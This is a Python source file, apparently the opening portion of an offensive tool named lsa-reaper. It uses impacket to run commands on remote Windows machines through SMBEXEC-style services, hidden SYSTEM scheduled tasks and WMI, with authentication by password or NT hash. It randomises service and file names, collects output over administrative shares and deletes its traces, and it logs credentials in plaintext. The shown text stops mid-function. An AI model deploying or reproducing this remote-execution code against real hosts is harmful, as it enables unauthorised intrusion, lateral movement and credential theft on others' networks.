from __future__ import division
from __future__ import print_function
import os
import re
import sys
import cmd
import time
import nmap
import glob
import json
import ntpath
import socket
import random
import string
import hashlib
import logging
import fnmatch
import requests
import argparse
import readline
import ipaddress
import threading
import subprocess
import collections
import socket, errno
import netifaces as ni
from threading import Thread
from base64 import b64encode
from datetime import datetime
from pebble import ProcessPool
from argparse import RawTextHelpFormatter

from six import PY2
from impacket import version
from impacket import smbserver
from impacket.examples import logger
from impacket.krb5.keytab import Keytab
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import tsch, transport, scmr
from impacket.examples.utils import parse_target
from impacket.ntlm import compute_lmhash, compute_nthash
from impacket.dcerpc.v5.dcomrt import DCOMConnection, COMVERSION
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.smbconnection import SMBConnection, SMB_DIALECT, SMB2_DIALECT_002, SMB2_DIALECT_21

try:
    from urllib.request import ProxyHandler, build_opener, Request
except ImportError:
    from urllib2 import ProxyHandler, build_opener, Request

try:
    import apt
except ModuleNotFoundError:
    print('Missing python-apt install with sudo apt install python-apt')
    sys.exit(1)

try:
    import ConfigParser
except ImportError:
    import configparser as ConfigParser


BATCH_FILENAME = ''.join(random.choices(string.ascii_uppercase, k=random.randrange(8, 15))) + '.bat'
SERVICE_NAME = ''.join(random.choices(string.ascii_uppercase, k=random.randrange(8, 15)))
OUTPUT_FILENAME = '__' + ''.join(random.choices(string.ascii_uppercase, k=random.randrange(8, 17)))
CODEC = sys.stdout.encoding

today = datetime.now()
hour = today.strftime("%H")
ltime = time.localtime(time.time())
timestamp = '%s-%s-%s_%s-%s-%s' % ( str(ltime.tm_mon).zfill(2), str(ltime.tm_mday).zfill(2), str(ltime.tm_year).zfill(2), str(hour).zfill(2), str(ltime.tm_min).zfill(2), str(ltime.tm_sec).zfill(2))

acct_chk_fail = []  # this list is used to track failed login attempts
acct_chk_valid = []  # this is used to track previously valid accounts

###################COLORS#################
color_RED = '\033[91m'
color_GRE = '\033[92m'
color_YELL = '\033[93m'
color_BLU = '\033[94m'
color_PURP = '\033[35m'
color_reset = '\033[0m'
green_plus = '{}[+]{}'.format(color_GRE, color_reset)
red_minus = '{}[-]{}'.format(color_RED, color_reset)
gold_plus = '{}[+]{}'.format(color_YELL, color_reset)
yellow_minus = '{}[-]{}'.format(color_YELL, color_reset)

reaper_banner = """

 ██{}▓{}      ██████  ▄▄▄          ██▀███  {}▓{}█████ ▄▄▄       ██{}▓{}███  {}▓{}█████  ██▀███  
{}▓{}██{}▒    ▒{}██    {}▒ ▒{}████▄       {}▓{}██ {}▒{} ██{}▒▓{}█   ▀{}▒{}████▄    {}▓{}██{}░{}  ██{}▒▓{}█   ▀ {}▓{}██ {}▒{} ██{}▒{}
{}▒{}██{}░    ░ ▓{}██▄   {}▒{}██  ▀█▄     {}▓{}██ {}░{}▄█ {}▒▒{}███  {}▒{}██  ▀█▄  {}▓{}██{}░{} ██{}▓▒▒{}███   {}▓{}██ {}░{}▄█ {}▒{}
{}▒{}██{}░      ▒{}   ██{}▒░{}██▄▄▄▄██    {}▒{}██▀▀█▄  {}▒▓{}█  ▄{}░{}██▄▄▄▄██ {}▒{}██▄█{}▓▒ ▒▒▓{}█  ▄ {}▒{}██▀▀█▄  
{}░{}██████{}▒▒{}██████{}▒▒ ▓{}█   {}▓{}██{}▒   ░{}██{}▓ ▒{}██{}▒░▒{}████{}▒▓{}█   {}▓{}██{}▒▒{}██{}▒ ░  ░░▒{}████{}▒░{}██{}▓ ▒{}██{}▒
░ ▒░▓  ░▒ ▒▓▒ ▒ ░ ▒▒   ▓▒{}█{}░   ░ ▒▓ ░▒▓░░░ ▒░ ░▒▒   ▓▒{}█{}░▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░ ▒  ░░ ░▒  ░ ░  ▒   ▒▒ ░     ░▒ ░ ▒░ ░ ░  ░ ▒   ▒▒ ░░▒ ░      ░ ░  ░  ░▒ ░ ▒░
  ░ ░   ░  ░  ░    ░   ▒        ░░   ░    ░    ░   ▒   ░░          ░     ░░   ░ 
    ░  ░      ░        ░  ░      ░        ░  ░     ░  ░            ░  ░   ░  {}                                                                                   
""".format(color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset,
           color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset)

cwd = os.path.abspath(os.path.dirname(__file__))


def lognoprint(logme):
    with open('{}/log.txt'.format(cwd), 'a') as f:
        f.write(logme + '\n')
        f.close()

    with open('{}/indivlog.txt'.format(cwd), 'a') as f:
        f.write(logme + '\n')
        f.close()


def printnlog(printlogme):
    with open('{}/log.txt'.format(cwd), 'a') as f:
        f.write(printlogme + '\n')
        f.close()

    with open('{}/indivlog.txt'.format(cwd), 'a') as f:
        f.write(printlogme + '\n')
        f.close()

    print(printlogme)


if os.path.isfile('{}/indivlog.txt'.format(cwd)):
    os.system('sudo rm {}/indivlog.txt'.format(cwd))


################################################ Start of SMBEXEC ###############################################################

class CMDEXEC:
    def __init__(self, command2run='', username='', password='', domain='', hashes=None, aesKey=None, doKerberos=None,
                 kdcHost=None, share=None, port=445, serviceName=SERVICE_NAME, shell_type=None):

        self.__command2run = command2run
        self.__username = username
        self.__password = password
        self.__port = port
        self.__serviceName = serviceName
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__share = share
        self.__shell_type = shell_type
        self.shell = None
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, remoteName, remoteHost):
        stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
        logging.debug('StringBinding %s' % stringbinding)
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        rpctransport.set_dport(self.__port)
        rpctransport.setRemoteHost(remoteHost)
        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash,
                                         self.__nthash, self.__aesKey)
        rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

        self.shell = None
        try:
            self.shell = SMBEXECShell(self.__share, rpctransport, self.__serviceName, self.__shell_type, self.__command2run, remoteName, self.__domain, self.__username, self.__password, self.__nthash)
        except  (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.critical(str(e))
            if self.shell is not None:
                self.shell.finish()
            sys.stdout.flush()
            sys.exit(1)


class SMBEXECShell():
    def __init__(self, share, rpc, serviceName, shell_type, command2run, addr, domain, username, password, nthash):

        self.__share = share
        self.__output = '\\\\%COMPUTERNAME%\\' + self.__share + '\\' + OUTPUT_FILENAME
        self.__batchFile = '%TEMP%\\' + BATCH_FILENAME
        self.__outputBuffer = b''
        self.__command = ''
        self.__shell = '%COMSPEC% /Q /c '
        self.__shell_type = shell_type
        self.__serviceName = serviceName
        self.__rpc = rpc

        self.__scmr = rpc.get_dce_rpc()
        try:
            self.__scmr.connect()
        except Exception as e:
            logging.critical(str(e))
            sys.exit(1)

        s = rpc.get_smb_connection()

        # We don't wanna deal with timeouts from now on.
        s.setTimeout(100000)
        try:
            self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
            resp = scmr.hROpenSCManagerW(self.__scmr)
            self.__scHandle = resp['lpScHandle']
            self.transferClient = rpc.get_smb_connection()
            self.do_cd('', addr)
            if command2run == 'wmic logicaldisk get caption ':  # so auto drive can work since it does not conatin any & symbols
                self.send_data(command2run, addr)
            else:
                tmphold = self.send_data(command2run[:command2run.find('&')], addr)
                if (tmphold.find('The command completed successfully') != -1 and tmphold.find('System error 85 has occurred') == -1):  # SMBEXEC dummy and cant accept && so we must ensure that the net use command worked so we dont delete client shares ##
                    command2run = command2run[command2run.find('&&') + 3:]
                    tmphold = self.send_data(command2run[:command2run.find('&')], addr)
                    command2run = command2run[command2run.find('&&') + 3:]
                    tmphold = self.send_data(command2run[:command2run.find('&')], addr)
                    if command2run.find('cleanup.bat') != -1:
                        command2run = command2run[command2run.find('&&') + 3:]
                        tmphold = self.send_data(command2run[:command2run.find('&')], addr)
                else:
                    printnlog('{}: SMBEXEC net use failed: {}'.format(addr, tmphold))

        except BaseException as e:
            if str(e).lower().find('dce') != -1:
                printnlog('DCE RPC Error: ' + str(e))
            elif str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') != -1:
                if os.path.isfile('{}/smbexec-shellless.py'.format(cwd)):
                    if logging.getLogger().level == logging.DEBUG: # ok we got the dumb error that I cant track down so were gonna just run smbexec-shellless until it works
                        printnlog('{}: Status object error happened switching to smbexec-shellless loophole\n'.format(addr))
                    else:
                        lognoprint('{}: Status object error happened switching to smbexec-shellless loophole\n'.format(addr))
                    # run the command
                    if password != '' and nthash == '': # if we are using a password to authenticate
                        if logging.getLogger().level == logging.DEBUG:  # if were debugging print the output of smbexec-shellless
                            printnlog('{}: Executing python3 {}/smbexec-shellless.py {}/{}:\'{}\'@{}  \'{}\'\n'.format(addr, cwd, domain, username, password, addr, command2run))
                        else:  # otherwise just log it to the outputfile
                            lognoprint('{}: Executing python3 {}/smbexec-shellless.py {}/{}:\'{}\'@{}  \'{}\'\n'.format(addr, cwd, domain, username, password, addr, command2run))

                        data_out = subprocess.getoutput('python3 {}/smbexec-shellless.py {}/{}:\'{}\'@{}  \'{}\''.format(cwd, domain, username, password, addr, command2run))
                        retries = 0
                        while data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') != -1:  # this should work if we get a statys_object_name_not_found error to just rerun smbexec until it works
                            data_out = subprocess.getoutput('python3 {}/smbexec-shellless.py {}/{}:\'{}\'@{}  \'{}\''.format(cwd, domain, username, password, addr, command2run))
                            if logging.getLogger().level == logging.DEBUG:
                                printnlog('{}: DATA_OUT1: {}'.format(addr, data_out))
                            else:
                                lognoprint('{}: DATA_OUT2: {}'.format(addr, data_out))
                            if retries >= 12 and data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') != -1:
                                printnlog('{}[!]{} {}: Max Retries hit, skipping'.format(color_YELL, color_reset, addr))
                                break
                            else:
                                retries += 1

                    else:# if we are using a nthash to authenticate
                        retries = 0
                        if logging.getLogger().level == logging.DEBUG:
                            printnlog('{}: Executing python3 {}/smbexec-shellless.py {}/{}@{} -hashes \'{}\' \'{}\'\n'.format(addr, cwd, domain, username, addr, nthash, command2run))
                        else:  # otherwise just log it to the outputfile
                            lognoprint('{}: Executing python3 {}/smbexec-shellless.py {}/{}@{} -hashes \'{}\' \'{}\'\n'.format(addr, cwd, domain, username, addr, nthash, command2run))

                        data_out = subprocess.getoutput('python3 {}/smbexec-shellless.py {}/{}@{} -hashes \'{}\' \'{}\''.format(cwd, domain, username, addr, nthash, command2run))

                        while data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') != -1:  # this should work if we get a statys_object_name_not_found error to just rerun smbexec until it works
                            data_out = subprocess.getoutput('python3 {}/smbexec-shellless.py {}/{}@{} -hashes \'{}\' \'{}\''.format(cwd, domain, username, addr, nthash, command2run))
                            if logging.getLogger().level == logging.DEBUG: # logging stuff
                                printnlog('{}: DATA_OUT3: {}'.format(addr, data_out))
                            else:
                                lognoprint('{}: DATA_OUT4: {}'.format(addr, data_out))
                            if retries >= 12 and data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') != -1:
                                printnlog('{}[!]{} {}: Max Retries hit, skipping'.format(color_YELL, color_reset, addr))
                                break
                            else:
                                retries += 1

                    if logging.getLogger().level == logging.DEBUG:
                        printnlog('{}: DATA_OUT5: {}'.format(addr, data_out))
                    else:
                        lognoprint('{}: DATA_OUT6: {}'.format(addr, data_out))
                else:
                    printnlog('You dont seem to have {}/smbexec-shellless.py you should put that in the same directory as lsa-reaper.py as it is required'.format(cwd))
            else:
                printnlog('{}: Error in here: {}'.format(addr, str(e)))
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()



    def finish(self):
        # Just in case the service is still created
        try:
            self.__scmr = self.__rpc.get_dce_rpc()
            self.__scmr.connect()
            self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
            resp = scmr.hROpenSCManagerW(self.__scmr)
            self.__scHandle = resp['lpScHandle']
            resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
            service = resp['lpServiceHandle']
            scmr.hRDeleteService(self.__scmr, service)
            scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
            scmr.hRCloseServiceHandle(self.__scmr, service)
        except scmr.DCERPCException:
            pass

    def do_cd(self, s, addr):
        # We just can't CD or maintain track of the target dir.
        if len(s) > 0:
            logging.error("You can't CD under SMBEXEC. Use full paths.")

        self.execute_remote('cd ', addr)
        if len(self.__outputBuffer) > 0:
            # Stripping CR/LF
            self.prompt = self.__outputBuffer.decode().replace('\r\n', '') + '>'

            self.__outputBuffer = b''

    def get_output(self, addr):
        def output_callback(data):
            self.__outputBuffer += data

        while True: # this fixes the STATUS_SHARING_VIOLATION error thx Kyle <3
            try:
                lognoprint('{}: Getting the bat file'.format(addr))
                self.transferClient.getFile(self.__share, OUTPUT_FILENAME, output_callback)
                break  # Exit the loop if getFile is successful
            except Exception as e:
                lognoprint('{}: Failed to get the bat file'.format(addr))
                time.sleep(5)

            # This line will only be reached if the file is successfully retrieved
        self.transferClient.deleteFile(self.__share, OUTPUT_FILENAME)
        lognoprint('{}: Deleted the bat file'.format(addr))

    def execute_remote(self, data, addr, shell_type='cmd'):

        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + \
                  self.__shell + self.__batchFile

        command += ' & ' + '%COMSPEC% /Q /c del ' + self.__batchFile

        logging.debug('Executing %s' % command)
        lognoprint('{}: {}\n'.format(addr, 'Executing %s' % command))

        resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName,
                                     lpBinaryPathName=command, dwStartType=scmr.SERVICE_DEMAND_START)
        service = resp['lpServiceHandle']

        try:
            scmr.hRStartServiceW(self.__scmr, service)
        except:
            pass
        scmr.hRDeleteService(self.__scmr, service)
        scmr.hRCloseServiceHandle(self.__scmr, service)
        self.get_output(addr)

    def send_data(self, data, addr):
        self.execute_remote(data, addr, self.__shell_type)
        try:
            data_out = self.__outputBuffer.decode(CODEC)
            if logging.getLogger().level == logging.DEBUG:
                print('{}: {}'.format(addr, data_out))
            with open('{}/drives.txt'.format(cwd), 'a') as f:  # writing to a file gets around the issue of multithreading not being easily readable
                f.write(data_out)
                f.close()

            lognoprint('{}: {}\n'.format(addr, data_out))
            self.__outputBuffer = b''
            return data_out
        except UnicodeDecodeError:
            if data != 'wmic logicaldisk get caption ':
                logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                              'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute smbexec.py '
                              'again with -codec and the corresponding codec')
                printnlog('{}: decode error: {}\n'.format(addr, self.__outputBuffer.decode(CODEC, errors='replace')))
            with open('{}/drives.txt'.format(cwd), 'a') as f:  # writing to a file gets around the issue of multithreading not being easily readable
                f.write(self.__outputBuffer.decode(CODEC, errors='replace'))
                f.close()

        self.__outputBuffer = b''


################################################ End of SMBEXEC ###################################################################


################################################# START OF ATEXEC #########################################################################
class TSCH_EXEC:
    def __init__(self, username='', password='', domain='', hashes=None, aesKey=None, doKerberos=False, kdcHost=None,
                 command=None, sessionId=None, silentCommand=False):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__command = command
        self.__silentCommand = silentCommand
        self.sessionId = sessionId

        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def play(self, addr):
        stringbinding = r'ncacn_np:%s[\pipe\atsvc]' % addr
        rpctransport = transport.DCERPCTransportFactory(stringbinding)

        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                         self.__aesKey)
            rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
        try:
            self.doStuff(rpctransport, addr)
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            lognoprint('{}: {}\n'.format(addr, e))
            logging.error('{}: {}'.format(addr, e))
            if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >= 0:
                logging.info('When STATUS_OBJECT_NAME_NOT_FOUND is received, try running again. It might work')

    def doStuff(self, rpctransport, addr):
        def output_callback(data):
            try:
                lognoprint('{}: {}\n'.format(addr, data.decode(CODEC)))
                if logging.getLogger().level == logging.DEBUG:
                    print('{}: {}'.format(addr, data.decode(CODEC)))
            except UnicodeDecodeError:
                logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                              'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute atexec.py '
                              'again with -codec and the corresponding codec')
                printnlog('{}: decode error1 {}'.format(addr, data.decode(CODEC, errors='replace')))

        def xml_escape(data):
            replace_table = {
                "&": "&amp;",
                '"': "&quot;",
                "'": "&apos;",
                ">": "&gt;",
                "<": "&lt;",
            }
            return ''.join(replace_table.get(c, c) for c in data)

        def cmd_split(cmdline):
            cmdline = cmdline.split(" ", 1)
            cmd = cmdline[0]
            args = cmdline[1] if len(cmdline) > 1 else ''

            return [cmd, args]

        dce = rpctransport.get_dce_rpc()

        dce.set_credentials(*rpctransport.get_credentials())
        if self.__doKerberos is True:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.connect()
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce.bind(tsch.MSRPC_UUID_TSCHS)
        tmpName = ''.join([random.choice(string.ascii_letters) for _ in range(8)])
        tmpFileName = tmpName + '.tmp'

        if self.sessionId is not None:
            cmd, args = cmd_split(self.__command)
        else:
            cmd = "cmd.exe"
            args = "/C %s > %%windir%%\\Temp\\%s 2>&1" % (self.__command, tmpFileName)

        xml = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>%s</Command>
      <Arguments>%s</Arguments>
    </Exec>
  </Actions>
</Task>
        """ % ((xml_escape(cmd) if self.__silentCommand is False else self.__command.split()[0]),
               (xml_escape(args) if self.__silentCommand is False else " ".join(self.__command.split()[1:])))
        taskCreated = False
        try:
            lognoprint('{}: Creating task \\{}\n'.format(addr, tmpName))
            if logging.getLogger().level == logging.DEBUG:
                logging.info('{}: Creating task \\{}'.format(addr, tmpName))
            tsch.hSchRpcRegisterTask(dce, '\\%s' % tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
            taskCreated = True

            lognoprint('{}: Running task \\{}\n'.format(addr, tmpName))
            if logging.getLogger().level == logging.DEBUG:
                logging.info('{}: Running task \\{}'.format(addr, tmpName))
            done = False

            if self.sessionId is None:
                tsch.hSchRpcRun(dce, '\\%s' % tmpName)
            else:
                try:
                    tsch.hSchRpcRun(dce, '\\%s' % tmpName, flags=tsch.TASK_RUN_USE_SESSION_ID, sessionId=self.sessionId)
                except Exception as e:
                    if str(e).find('ERROR_FILE_NOT_FOUND') >= 0 or str(e).find('E_INVALIDARG') >= 0:
                        logging.info('The specified session doesn\'t exist!')
                        done = True
                    else:
                        raise

            while not done:
                logging.debug('Calling SchRpcGetLastRunInfo for \\%s' % tmpName)
                resp = tsch.hSchRpcGetLastRunInfo(dce, '\\%s' % tmpName)
                if resp['pLastRuntime']['wYear'] != 0:
                    done = True
                else:
                    time.sleep(2)
            lognoprint('{}: Deleting task \\{}\n'.format(addr, tmpName))
            if logging.getLogger().level == logging.DEBUG:
                logging.info('{}: Deleting task \\{}'.format(addr, tmpName))
            tsch.hSchRpcDelete(dce, '\\%s' % tmpName)
            taskCreated = False
        except tsch.DCERPCSessionError as e:
            logging.error(e)
            e.get_packet().dump()
        finally:
            if taskCreated is True:
                tsch.hSchRpcDelete(dce, '\\%s' % tmpName)

        if self.sessionId is not None:
            dce.disconnect()
            return

        if self.__silentCommand:
            dce.disconnect()
            return

        smbConnection = rpctransport.get_smb_connection()
        waitOnce = True
        while True:
            try:
                time.sleep(6)
                lognoprint('{}: Attempting to read ADMIN$\\Temp\\{}\n'.format(addr, tmpFileName))
                if logging.getLogger().level == logging.DEBUG:
                    logging.info('{}: Attempting to read ADMIN$\\Temp\\{}'.format(addr, tmpFileName))
                smbConnection.getFile('ADMIN$', 'Temp\\%s' % tmpFileName, output_callback)
                break
            except Exception as e:
                if str(e).find('SHARING') > 0:
                    time.sleep(3)
                elif str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >= 0:
                    if waitOnce is True:
                        # We're giving it the chance to flush the file before giving up
                        time.sleep(3)
                        waitOnce = False
                    else:
                        raise
                else:
                    raise
        lognoprint('{}: Deleting file ADMIN$\\Temp\\{}\n'.format(addr, tmpFileName))
        if logging.getLogger().level == logging.DEBUG:
            logging.debug('{}: Deleting file ADMIN$\\Temp\\{}'.format(addr, tmpFileName))
        smbConnection.deleteFile('ADMIN$', 'Temp\\%s' % tmpFileName)

        dce.disconnect()


########################################## END OF ATEXEC ############################################################################

########################################## START OF WMIEXEC #########################################################################
class WMIEXEC:
    def __init__(self, command='', username='', password='', domain='', hashes=None, aesKey=None, share=None,
                 noOutput=False, doKerberos=False, kdcHost=None, shell_type=None):
        self.__command = command
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__share = share
        self.__noOutput = noOutput
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__shell_type = shell_type
        self.shell = None
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, addr, silentCommand=False):
        if self.__noOutput is False and silentCommand is False:
            smbConnection = SMBConnection(addr, addr)
            if self.__doKerberos is False:
                smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            else:
                smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                            self.__nthash, self.__aesKey, kdcHost=self.__kdcHost)

            dialect = smbConnection.getDialect()

            if dialect == SMB_DIALECT:
                lognoprint("{}: SMBv1 dialect used\n".format(addr))
            elif dialect == SMB2_DIALECT_002:
                lognoprint("{}: SMBv2.0 dialect used\n".format(addr))
            elif dialect == SMB2_DIALECT_21:
                lognoprint("{}: SMBv2.1 dialect used\n".format(addr))
            else:
                lognoprint("{}: SMBv3.0 dialect used\n".format(addr))

            if logging.getLogger().level == logging.DEBUG:
                if dialect == SMB_DIALECT:
                    logging.info("{}: SMBv1 dialect used".format(addr))
                elif dialect == SMB2_DIALECT_002:
                    logging.info("{}: SMBv2.0 dialect used".format(addr))
                elif dialect == SMB2_DIALECT_21:
                    logging.info("{}: SMBv2.1 dialect used".format(addr))
                else:
                    logging.info("{}: SMBv3.0 dialect used".format(addr))
        else:
            smbConnection = None

        dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                              self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
        try:
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)  # if firewall blocking program hangs here
            iWbemLevel1Login.RemRelease()

            win32Process, _ = iWbemServices.GetObject('Win32_Process')

            self.shell = RemoteShell(self.__share, win32Process, smbConnection, self.__shell_type, addr, silentCommand)
            self.shell.onecmd(self.__command)
        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            lognoprint('{}: {}\n'.format(addr, str(e)))
            logging.error('{}: {}'.format(addr, str(e)))
            if smbConnection is not None:
                smbConnection.logoff()
            dcom.disconnect()
            sys.stdout.flush()
            pass

        if smbConnection is not None:
            smbConnection.logoff()
        dcom.disconnect()


class RemoteShell(cmd.Cmd):
    def __init__(self, share, win32Process, smbConnection, shell_type, addr, silentCommand=False):
        cmd.Cmd.__init__(self)
        self.__share = share
        self.__output = '\\' + OUTPUT_FILENAME
        self.__outputBuffer = str('')
        self.__shell = 'cmd.exe /Q /c '
        self.__shell_type = shell_type
        self.__win32Process = win32Process
        self.__transferClient = smbConnection
        self.__silentCommand = silentCommand
        self.__pwd = str('C:\\')
        self.__noOutput = False
        self.__addr = addr

        # We don't wanna deal with timeouts from now on.
        if self.__transferClient is not None:
            self.__transferClient.setTimeout(30000)
            self.do_cd('\\')
        else:
            self.__noOutput = True

        # If the user wants to just execute a command without cmd.exe, set raw command and set no output
        if self.__silentCommand is True:
            self.__shell = ''

    def do_cd(self, s):
        self.execute_remote('cd ' + s)
        if len(self.__outputBuffer.strip('\r\n')) > 0:
            print(self.__outputBuffer)
            self.__outputBuffer = ''
        else:
            if PY2:
                self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s.decode(sys.stdin.encoding)))
            else:
                self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s))
            self.execute_remote('cd ')
            self.__pwd = self.__outputBuffer.strip('\r\n')
            self.prompt = (self.__pwd + '>')

            self.__outputBuffer = ''

    def default(self, line):
        # Let's try to guess if the user is trying to change drive
        if len(line) == 2 and line[1] == ':':
            # Execute the command and see if the drive is valid
            self.execute_remote(line)
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                # Something went wrong
                printnlog('wmiexec output error: {}'.format(self.__outputBuffer))
                self.__outputBuffer = ''
            else:
                # Drive valid, now we should get the current path
                self.__pwd = line
                self.execute_remote('cd ')
                self.__pwd = self.__outputBuffer.strip('\r\n')
                self.prompt = (self.__pwd + '>')
                self.__outputBuffer = ''
        else:
            if line != '':
                self.send_data(line)

    def get_output(self):
        def output_callback(data):
            try:
                self.__outputBuffer += data.decode(CODEC)
            except UnicodeDecodeError:
                if logging.getLogger().level == logging.DEBUG and options.drive != None:
                    logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                                  'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute wmiexec.py '
                                  'again with -codec and the corresponding codec')
                self.__outputBuffer += data.decode(CODEC, errors='replace')


        if self.__noOutput is True:
            self.__outputBuffer = ''
            return

        while True:
            try:
                self.__transferClient.getFile(self.__share, self.__output, output_callback)
                break
            except Exception as e:
                if str(e).find('STATUS_SHARING_VIOLATION') >= 0:
                    # Output not finished, let's wait
                    time.sleep(1)
                    pass
                elif str(e).find('Broken') >= 0:
                    # The SMB Connection might have timed out, let's try reconnecting
                    logging.debug('Connection broken, trying to recreate it')
                    self.__transferClient.reconnect()
                    return self.get_output()
        self.__transferClient.deleteFile(self.__share, self.__output)

    def execute_remote(self, data, shell_type='cmd'):

        command = self.__shell + data

        if self.__noOutput is False:
            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output + ' 2>&1'
        if PY2:
            self.__win32Process.Create(command.decode(sys.stdin.encoding), self.__pwd, None)
